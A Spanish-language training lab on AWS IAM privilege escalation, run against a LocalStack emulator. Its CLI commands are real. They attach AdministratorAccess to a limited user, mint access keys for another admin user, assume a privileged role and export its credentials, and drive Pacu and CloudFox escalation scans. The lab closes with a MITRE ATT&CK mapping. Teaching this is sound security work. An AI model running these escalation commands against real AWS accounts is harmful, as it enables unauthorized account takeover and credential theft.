# Lab 02 — IAM Privilege Escalation

## Objetivo

Escalar privilegios en AWS partiendo de una cuenta con permisos limitados, aprovechando misconfiguraciones IAM para obtener acceso de administrador.

---

## Conceptos IAM

```
IAM Identity:  User → Group → Role
IAM Policy:    Allow/Deny + Action + Resource + Condition

Rutas de escalada:
  iam:CreatePolicyVersion    → crear versión con * en acciones
  iam:AttachUserPolicy       → asignarse AdministratorAccess
  iam:PassRole + ec2:RunInstances → lanzar EC2 con rol privilegiado
  iam:CreateAccessKey        → crear keys de otro usuario
  sts:AssumeRole             → asumir rol con más permisos
```

---

## Parte 1 — Reconocimiento desde cuenta limitada

```bash
ENDPOINT="--endpoint-url http://localstack:4566"

# ¿Quién soy?
aws sts get-caller-identity $ENDPOINT

# ¿Qué permisos tengo?
aws iam list-attached-user-policies \
    --user-name read-only-user $ENDPOINT

aws iam list-user-policies \
    --user-name read-only-user $ENDPOINT

# ¿A qué grupos pertenezco?
aws iam list-groups-for-user \
    --user-name read-only-user $ENDPOINT

# Simular permisos (aws iam simulate-principal-policy)
aws iam simulate-principal-policy \
    --policy-source-arn arn:aws:iam::000000000000:user/read-only-user \
    --action-names "iam:CreateAccessKey" "s3:GetObject" "iam:AttachUserPolicy" \
    $ENDPOINT
```

---

## Parte 2 — Escalada: AttachUserPolicy

Si el usuario tiene `iam:AttachUserPolicy`, puede asignarse `AdministratorAccess`:

```bash
# Con el usuario read-only, intentar asignarse admin
aws iam attach-user-policy \
    --user-name read-only-user \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
    $ENDPOINT

# Verificar si funcionó
aws iam list-attached-user-policies \
    --user-name read-only-user $ENDPOINT

# Ahora podemos hacer todo
aws s3 ls $ENDPOINT
aws iam list-users $ENDPOINT
```

---

## Parte 3 — Escalada: CreateAccessKey de otro usuario

```bash
# Crear access key del usuario dev-deploy (que tiene AdministratorAccess)
aws iam create-access-key \
    --user-name dev-deploy \
    $ENDPOINT

# Output:
# {
#   "AccessKey": {
#     "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
#     "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
#   }
# }

# Usar las nuevas keys
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

aws sts get-caller-identity $ENDPOINT
# → ahora somos dev-deploy con AdministratorAccess
```

---

## Parte 4 — Escalada: AssumeRole

```bash
# Verificar qué roles podemos asumir
aws iam list-roles $ENDPOINT \
    | python3 -c "
import sys,json
roles=json.load(sys.stdin)['Roles']
for r in roles:
    trust=r['AssumeRolePolicyDocument']
    print(r['RoleName'], '→', json.dumps(trust['Statement'][0]['Principal']))
"

# Asumir el rol ec2-prod-role
aws sts assume-role \
    --role-arn arn:aws:iam::000000000000:role/ec2-prod-role \
    --role-session-name pwned-session \
    $ENDPOINT

# Exportar credenciales temporales del rol asumido
eval $(aws sts assume-role \
    --role-arn arn:aws:iam::000000000000:role/ec2-prod-role \
    --role-session-name pwned-session \
    $ENDPOINT \
    --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
    --output text \
    | awk '{print "export AWS_ACCESS_KEY_ID="$1"\nexport AWS_SECRET_ACCESS_KEY="$2"\nexport AWS_SESSION_TOKEN="$3}')

aws sts get-caller-identity $ENDPOINT
```

---

## Parte 5 — Pacu (framework de explotación AWS)

```bash
# Iniciar Pacu
pacu

# Dentro de Pacu:
# Crear sesión
set_keys

# Enumerar todos los permisos del usuario actual
run iam__enum_permissions

# Buscar rutas de escalada automáticamente
run iam__privesc_scan

# Explotar la ruta encontrada
run iam__privesc_scan --escalate

# Enumerar todos los recursos accesibles
run aws__enum_account
```

---

## Parte 6 — CloudFox

```bash
# Enumerar toda la superficie de ataque de la cuenta
cloudfox aws --endpoint http://localstack:4566 \
    --profile localstack \
    all-checks

# Buscar credenciales expuestas
cloudfox aws --endpoint http://localstack:4566 access-keys

# Mostrar rutas de escalada IAM
cloudfox aws --endpoint http://localstack:4566 iam-privesc

# Roles asumibles
cloudfox aws --endpoint http://localstack:4566 role-trusts
```

---

## Actividades

1. Desde `read-only-user`, enumerar todos los permisos disponibles
2. Intentar asignarse `AdministratorAccess` con `iam:AttachUserPolicy`
3. Crear una access key del usuario `dev-deploy` y usarla
4. Asumir el rol `ec2-prod-role` y documentar los permisos obtenidos
5. Usar Pacu para encontrar y explotar automáticamente una ruta de escalada

---

## Mapeo MITRE ATT&CK

| Técnica | TTP |
|---------|-----|
| Valid Accounts — Cloud Accounts | T1078.004 |
| Cloud Account Privilege Escalation | T1548 |
| Steal Application Access Token | T1528 |
| Account Manipulation — Additional Cloud Roles | T1098.003 |
